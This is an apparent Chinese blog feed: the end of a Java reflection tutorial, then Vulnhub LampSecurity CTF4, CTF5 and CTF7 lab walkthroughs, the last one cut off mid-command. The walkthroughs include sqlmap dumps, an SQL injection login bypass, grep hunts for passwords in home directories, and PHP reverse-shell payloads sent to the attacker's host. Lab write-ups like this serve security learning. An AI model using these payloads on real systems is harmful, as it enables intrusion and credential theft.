Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;myPrivateStaticMethod&quot;</span>);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405232355378.png" alt="image-20240523235522310"></p><p>获取带参数私有的静态方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException,  IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;myPrivateStaticMethod&quot;</span>, String.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(<span class="literal">null</span>,<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在invoke带参数调用</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405232357095.png" alt="image-20240523235704034"></p><h2 id="获取对象的方法"><a href="#获取对象的方法" class="headerlink" title="获取对象的方法"></a>获取对象的方法</h2><h3 id="方法getDeclaredConstructor"><a href="#方法getDeclaredConstructor" class="headerlink" title="方法getDeclaredConstructor"></a>方法getDeclaredConstructor</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;buut&quot;</span>,<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//getDeclaredConstructor(String.class,int.class);后面跟着的是构造函数传入的参数</span></span><br></pre></td></tr></table></figure><p>相当于正常的调用字段或者函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;buut&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(field.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//调用方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;buut&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;myPublicMethod&quot;</span>);</span><br><span class="line">        method.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>其实调用了对象之后，直接套用之前的方式运行方法或者获取字段都是一样的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;buut&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(</span><br><span class="line">                <span class="string">&quot;myPrivateMethod&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                String.class</span><br><span class="line">        );</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(obj,<span class="string">&quot;helloworld&quot;</span>,<span class="string">&quot;xixix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405240016389.png" alt="image-20240524001645272"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub_LampSecurityCTF4</title>
      <link href="/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF4/"/>
      <url>/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF4/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">LampSecurityCTF4</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现-端口扫描"><a href="#主机发现-端口扫描" class="headerlink" title="主机发现 端口扫描"></a>主机发现 端口扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.144.0/24</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281038899.png" alt="image-20240428103839815"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p22,25,80,631 192.168.144.132</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281041630.png" alt="image-20240428104142561"></p><p>漏扫</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p22,25,80,631 192.168.144.132</span><br></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><p>我们的优先级是先使用80端口查看web服务寻找突破口,接着再是25端口的邮箱服务,接着是22的ssh端口</p><p>查看网页发现了id等字眼,尝试注入攻击,并且判断存在sql注入的可能</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281104615.png" alt="image-20240428110442572"></p><h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.144.133/index.html?page=blog&amp;title=Blog&amp;id=5&#x27; --dbs --dump --batch</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>–dbs表示枚举所有数据库系统， –dump参数是当发现有数据时自动转储 ，–batch是批处理命令</p><p><strong><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281108741.png" alt="image-20240428110807691"></strong></p><h2 id="SSH登录获得初始立足点"><a href="#SSH登录获得初始立足点" class="headerlink" title="SSH登录获得初始立足点"></a>SSH登录获得初始立足点</h2><p>当我们得到了用户密码之后我们尝试使用ssh登录</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281116717.png" alt="image-20240428111655670"></p><p>我们根据报错可以得到报错<code>没有找到匹配的密钥交换方法。他们的报价：diffie-hellman-group-exchange-sha1，diffie-hellman-group 14-sha1，diffie-hellman-group 1-sha1</code>,这是由于靶机太老了，ssh的版本有问题。不过我们可以指定修改一些参数实现登录.解决方法也很简单,直接添加方法和参数</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281122635.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.144.133</span><br></pre></td></tr></table></figure><p>解决方法同上</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281123614.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss dstevens@192.168.144.133</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281126640.png" alt="image-20240428112619605"></p><p>成功进入ssh</p><h2 id="ssh提权"><a href="#ssh提权" class="headerlink" title="ssh提权"></a>ssh提权</h2><p>连接之后的基本信息收集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami查看当前账户，uname -a查看操作系统版本，ip a或ifconfig查看ip信息,pwd可以看到当前目录.使用sudo -l查看当前权限</span><br></pre></td></tr></table></figure><p>直接就是全部的权限了</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281146244.png" alt="image-20240428114617186"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个比较简单,只要找到注入口就好了,sqlmap一梭哈.不能单纯依赖nmap和sqlmap这种自动化工具，还是要了解漏洞的原理与代码的编写，使用工具表面上方便，但会有很多缺点。比如容易暴露流量特征、难以进行精确的操作、工具有可能被ban等。归根结底，工具只是在我们了解漏洞原理和代码的基础上，加快我们的渗透进程，而不是渗透测试的核心所在。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场-Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub_LampSecurityCTF5</title>
      <link href="/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF5/"/>
      <url>/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF5/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">LampSecurityCTF5</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.144.0/24</span><br><span class="line">nmap --min-rate -p- 192.168.144.134</span><br><span class="line">nmap -sT -sV -O -p22,25,80,110,111,139,143,445,901,3306,36184 192.168.144.134</span><br><span class="line">nmap -sU -p- 192.168.144.134</span><br><span class="line">nmap --script=vuln -p22,25,80,110,111,139,143,445,901,3306 192.168.144.134</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281544093.png" alt="image-20240428154421014"></p><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><ul><li>查看80端口发现是一个cms服务–nanocms，并且发现一个小的后台登陆，但是尝试弱口令失败，现在方向就是尝试寻找历史漏洞看看能不能利用</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281549696.png" alt="image-20240428154926575"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281550816.png" alt="image-20240428155021701"></p><p>利用searchsploit工具寻找playload,但是比较可惜的是这个需要验证登陆之后才能用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit nanocms </span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281556245.png" alt="image-20240428155658212"></p><h2 id="NanoCMS信息泄露利用"><a href="#NanoCMS信息泄露利用" class="headerlink" title="NanoCMS信息泄露利用"></a>NanoCMS信息泄露利用</h2><p>继续尝试google一下playload以及使用方法,发现一个密码泄露的漏洞,并且使用成功<br><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281604693.png" alt="image-20240428160431641"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281606229.png" alt="image-20240428160613199"></p><p>利用泄露出来的账号密码登录,密码通过md5解密出来,进入后台</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281608172.png" alt="image-20240428160829130"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281618775.png" alt="image-20240428161840664"></p><h2 id="利用CMS漏洞点反弹shell"><a href="#利用CMS漏洞点反弹shell" class="headerlink" title="利用CMS漏洞点反弹shell"></a>利用CMS漏洞点反弹shell</h2><ul><li>寻找反弹shell的点,并且注入代码,开启监听</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.144.132/233 0&gt;&amp;1&#x27;&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281625041.png" alt="image-20240428162502944"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281625738.png" alt="image-20240428162521711"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul><li>一套信息收集,权限很低</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281630142.png" alt="image-20240428163022103"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281631834.png" alt="image-20240428163118795"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281632957.png" alt="image-20240428163216893"></p><h2 id="利用敏感信息提权"><a href="#利用敏感信息提权" class="headerlink" title="利用敏感信息提权"></a>利用敏感信息提权</h2><p>首先发现存在多个用户都有bash的环境,我们的思路可以在home目录下寻找这些用户是否会讲root用户的账号密码写在某个文本里面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R -i pass /home/* 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ul><li><p><code>grep</code>: <code>grep</code>是一个非常强大的文本搜索工具，用于搜索匹配指定模式的文本行。它的名字来源于Global Regular Expression Print，意味着它可以使用正则表达式来搜索文本。</p></li><li><p><code>-R</code> 或 <code>--recursive</code>: 这个选项告诉<code>grep</code>递归地搜索指定目录下的所有文件和子目录。这意味着，<code>grep</code>将会查看<code>/home</code>目录下的每个文件和目录，以及这些目录下的所有子目录，依此类推。</p></li><li><p><code>-i</code> 或 <code>--ignore-case</code>: 这个选项使搜索不区分大小写。也就是说，无论是”Pass”、”PASS”还是”pass”，只要文本行中包含这个字符串，就会被<code>grep</code>找到。</p></li><li><p><code>pass</code>: 这是<code>grep</code>需要搜索的文本字符串。在这个例子中，我们正在搜索包含字符串”pass”的文本行。</p></li><li><p><code>/home/*</code>: 这指定了搜索的起始目录。<code>/home</code>通常是Linux系统中所有用户家目录的父目录。<code>*</code>是一个通配符，表示<code>/home</code>目录下的所有文件和子目录。然而，由于使用了<code>-R</code>选项，<code>grep</code>会忽略这个通配符，而是递归搜索<code>/home</code>下的所有内容。</p></li><li><p><code>2&gt;/dev/null</code>: 这部分是对命令的输出进行重定向。在Linux中，<code>2</code>代表标准错误（stderr），<code>&gt;</code>是重定向操作符，<code>/dev/null</code>是一个特殊的设备文件，它会丢弃掉任何写入它的数据。这个表达式的意思是将所有的错误信息（如没有权限访问某些文件的错误）重定向到<code>/dev/null</code>，也就是说，这些错误信息将被忽略，不会显示在命令行输出中。</p></li></ul><p>综上所述，这条命令的作用是在<code>/home</code>目录及其所有子目录中，不区分大小写地搜索所有包含字符串”pass”的文件，并且忽略所有的错误信息。这个命令在查找包含密码信息的文件时可能会非常有用，但也应该小心使用，以避免泄露敏感信息。</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281648118.png" alt="image-20240428164817075"></p><p>查看文本获取内容,其中<code>50$cent</code>可能是密码</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281648560.png" alt="image-20240428164859502"></p><p>使用提权的命令,发现因为交互不完整导致了不能使用,尝试使用python获得更好的交互环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281657024.png" alt="image-20240428165748982"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><ul><li><p><code>python</code>: 这是启动Python解释器的命令。该命令假设系统上已安装了Python，并且<code>python</code>命令已正确配置在系统的PATH环境变量中。</p></li><li><p><code>-c</code>: 这个选项允许你直接在命令行中运行一段Python代码，而不是运行一个Python文件。紧随其后的字符串将被作为Python代码执行。</p></li><li><p><code>&quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code>: 这是传递给Python解释器的实际Python代码，分为两部分：</p><ul><li><code>import pty</code>: 这一部分导入了Python的<code>pty</code>模块。<code>pty</code>模块可以用来创建伪终端（pseudo-terminal），伪终端允许程序像真实终端一样读写，这对于需要终端交互的程序（如shell）非常有用。</li><li><code>pty.spawn(&#39;/bin/bash&#39;)</code>: 这一部分调用了<code>pty</code>模块的<code>spawn</code>函数，并传递<code>&#39;/bin/bash&#39;</code>作为参数。<code>spawn</code>函数启动一个新的进程（在这个例子中是<code>bash</code> shell），并将伪终端的输入和输出连接到这个进程上。这样，用户就可以通过Python脚本启动的伪终端与bash shell进行交互。</li></ul></li></ul><p>简而言之，这条命令通过Python创建了一个新的bash shell，并通过一个伪终端与之交互。这在渗透测试中尤其有用，因为它可以提供一个完整的交互式shell环境，即使是在通过某些限制性环境（如某些类型的反向shell）获得的初始执行环境中。使用这种方法，攻击者可以更方便地执行命令、移动文件等，就好像他们直接登录到目标系统上一样。</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281659774.png" alt="image-20240428165935734"></p><p>提权成功</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>搜索含有pass字符串的文件也是很有经验的操作，而这步操作正是基于&#x2F;etc&#x2F;passwd文件中的多用户bash的情况，很有可能有用户为了方便提权操作，会在自己的目录下存放有关提权的密码文件，我们正是利用了这一点</p>]]></content>
      
      
      <categories>
          
          <category> 靶场-Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub_LampSecurityCTF7</title>
      <link href="/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF7/"/>
      <url>/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF7/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">LampSecurityCTF7</h1><h1 id="主机发现与端口扫描"><a href="#主机发现与端口扫描" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.144.0/24</span><br><span class="line">nmap --min-rate -p- 192.168.144.135</span><br><span class="line">nudo nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.144.135</span><br><span class="line">nmap -sU -p- 192.168.144.135</span><br><span class="line">nmap --script=vuln -p22,80,137,138,139,901,5900,8080,10000 192.168.144.135</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281732861.png"></p><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ul><li>在端口80和8080寻找突破口，常用的思路是目录遍历,文件读取,登录框弱口令,sql注入,寻找框架漏洞。在8080端口的登录中发现存在sql注入的漏洞</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281739280.png" alt="image-20240428173946247"></p><p>使用弱密码<code>‘ or 1=1 #</code>发现不需要密码也可登录(我个人感觉现实的这种情况太少了)</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031731749.png" alt="image-20240503173107608"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul><li>接着就是常规思路，在后台中找到文件上传的点，尝试上传一句话木马文件。在Add a new Readings这个界面存在文件上传的点。传入一句话木马</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031739333.png" alt="image-20240503173920260"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031740839.png" alt="image-20240503174031793"></p><p>虽然说上传成功，但是没有返回文件的路径<strong>现在的思路就变成寻找文件目录地址，我们可以尝试报错得到文件的目录路径</strong>直接什么内容都不添加去报错得到文件路径</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031742171.png" alt="image-20240503174256135"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031743027.png" alt="image-20240503174344980"></p><p>后面就是简单的开启监听并且运行木马文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.144.132/233 0&gt;&amp;1&#x27;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405032032527.png" alt="image-20240503203250467"></p><h1 id="主机提权"><a href="#主机提权" class="headerlink" title="主机提权"></a>主机提权</h1><ul><li>首先一波信息提权收集，得到的权限特别低.但是我们看到passwd这个内容,发现有很多用户,都是跟网站上面的那些用户名一样,所以我们看看能不能得到类似用户的账号密码,<strong>接下来就是查看密码</strong></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405032109991.png" alt="image-20240503210934909"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405032111885.png" alt="image-20240503211100813"></p><ul><li>先用上一部靶机的思路看看有没有备份文件,发现命令是不能执行的</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R -i pass /home/* 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="寻找敏感信息"><a href="#寻找敏感信息" class="headerlink" title="寻找敏感信息"></a>寻找敏感信息</h2><ul><li>查找发现在路径<code>/var/www/admin/inc</code>下存在sql数据库的配置文件,用户名是root密码为空</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405032132975.png" alt="image-20240503213243910"></p><ul><li>连接数据库</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot</span><br></pre></td></tr></table></figure><p>gg不知道为什么这个数据库连接不上</p><p>没办法了</p><h1 id="方法二：利用sql注入sqlmap一把梭哈"><a href="#方法二：利用sql注入sqlmap一把梭哈" class="headerlink" title="方法二：利用sql注入sqlmap一把梭哈"></a>方法二：利用sql注入sqlmap一把梭哈</h1><h2 id="注入点的寻找"><a href="#注入点的寻找" class="headerlink" title="注入点的寻找"></a>注入点的寻找</h2><ul><li>在注册界面存在sql报错</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051756260.png" alt="image-20240505175607198"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051755779.png" alt="image-20240505175545693"></p><ul><li>利用bp抓包并且保存数据包 使用sqlmap梭哈</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051758596.png" alt="image-20240505175800537"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 2.txt --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051806403.png" alt="image-20240505180635355"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r packet.txt -D website --tables</span><br><span class="line">sqlmap -r packet.txt -D website -T users --columns</span><br><span class="line">sqlmap -r packet.txt -D website -T users -C username,password 